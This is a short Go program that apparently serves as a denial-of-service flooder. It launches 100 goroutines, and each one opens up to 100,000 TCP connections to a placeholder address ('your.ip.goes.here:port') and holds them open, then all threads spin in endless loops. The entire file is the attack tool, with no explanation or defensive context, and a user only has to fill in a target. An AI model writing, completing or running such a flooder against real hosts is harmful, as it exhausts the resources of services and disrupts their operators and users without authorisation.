package main

import (
        "net"
)
func fl(){
  a:=make([]net.Conn, 0)
  for i := 0; i < 100000; i++{
  c,_ := net.Dial("tcp","your.ip.goes.here:port")
  a=append(a,c)
}
for{}
}
func main() {
for i := 0; i < 100; i++{
go fl()
}
for{
}
}
